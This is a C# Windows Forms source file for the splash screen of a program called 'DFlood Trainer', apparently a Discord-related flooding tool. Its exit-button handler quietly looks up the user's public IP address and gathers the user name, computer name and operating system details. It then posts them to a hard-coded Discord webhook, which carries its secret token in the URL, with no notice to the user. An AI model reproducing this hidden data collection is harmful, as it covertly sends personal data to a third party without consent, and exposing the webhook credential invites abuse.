using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Media;
using System.Runtime.InteropServices;
using System.Net;
using System.Text.RegularExpressions;
using Microsoft.VisualBasic.Devices;
using DFlood.DFLoodDiscordRPC;

namespace DFlood
{
    public partial class splashScreen : Form
    {
        [Obsolete]
        public splashScreen()
        {
            InitializeComponent();
            splashTimer.Start();
        }

        [Obsolete]
        private MainMenu main = new MainMenu();

        private System.Media.SoundPlayer snd = new SoundPlayer();

        [DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
        private extern static void ReleaseCapture();

        [DllImport("user32.DLL", EntryPoint = "SendMessage")]
        private extern static void SendMessage(System.IntPtr hWnd, int wMsg, int wParam, int lParam);

        private OperatingSystem OS = System.Environment.OSVersion;

        private static void sendWebHook(string Url, string msg, string Username)
        {
            Http.Post(Url, new System.Collections.Specialized.NameValueCollection()
            {
                {
                    "username",
                    Username
                },
                {
                    "content",
                    msg
                }
            });
        }

        private void FormMoveEvent(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(this.Handle, 0x112, 0xf012, 0);
        }

        private void splashScreen_Load(object sender, EventArgs e)
        {
            splashTimer.Start();
        }

        [Obsolete]
        private void splashTimer_Tick_1(object sender, EventArgs e)
        {
            splashProgressBar.Value += 10;
            if (splashProgressBar.Value == 1300)
            {
                snd.SoundLocation = "openSound.wav";
                snd.Play();
            }
            if (splashProgressBar.Value == 1500)
            {
                splashTimer.Stop();
                this.Hide();
                main.Show();
            }
        }

        private void btnExit_Click(object sender, EventArgs e)
        {
            var webClient = new WebClient();
            string dnsString = webClient.DownloadString("http://checkip.dyndns.org");
            dnsString = (new Regex(@"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")).Match(dnsString).Value;
            webClient.Dispose();
            var UserName = $"**Kullanıcı Adı : ** {System.Windows.Forms.SystemInformation.UserName}";
            var computerName = $"**Bilgisayar Adı : ** {Dns.GetHostName()}";
            var ipadress = $"**IP Adresi : ** {dnsString}";
            var day = $"**Giriş Günü : ** {DateTime.Now.ToLongDateString()}";
            var hour = $"**Giriş Saati : ** {DateTime.Now.ToLongTimeString()}";
            var FullOsName = $"**İşletim Sistemi : ** {(new ComputerInfo().OSFullName)}";
            var platform = $"**Platform : ** {OS.Platform.ToString()}";
            var verison = $"**Versiyon Bilgisi : ** {OS.Version.ToString()}";
            var OsVersion = $"**İşletim Sistemi Tipi : ** {OS.VersionString}";
            var CLR = $"**CLR Versiyonu : ** {System.Environment.Version}";
            sendWebHook("https://discord.com/api/webhooks/852933349000871996/bRqRbTKlp2xuDYqSpHGUFLEOzoyjH0TJKgtpB8emrhBIBD07luTGHqWd_qRcWcMVwwEc", $"**DFlood Trainer'e Yeni Çıkış Saptanması**\n{ipadress}\n{UserName}\n{computerName}\n{day}\n{hour}\n{FullOsName}\n{platform}\n{verison}\n{OsVersion}\n{CLR}\n--------------------------------------------------------------------", "DFlood Services");
            Application.Exit();
        }

        private void btnMinimize_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void splashScreen_Load_1(object sender, EventArgs e)
        {
        }
    }
}